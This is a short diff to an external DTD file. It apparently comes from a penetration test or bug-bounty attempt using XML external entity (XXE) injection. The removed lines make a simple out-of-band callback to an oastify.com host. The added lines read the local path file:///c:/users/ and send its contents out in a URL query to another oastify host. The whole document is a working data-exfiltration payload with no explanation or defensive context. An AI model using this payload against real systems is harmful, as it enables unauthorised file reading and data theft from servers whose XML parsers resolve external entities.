@@ -1,2 +1,4 @@
-<!ENTITY % test SYSTEM "http://0fg813a9i4l13frm6cbhnflbl2rufq3f.oastify.com/xxe-test">
-%test;
+<!ENTITY % file SYSTEM "file:///c:/users/">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://users-list.lyntkotu1p4mm0a7pxu2604w4nagy6mv.oastify.co/?data=%file;'>">
+%eval;
+%exfil;
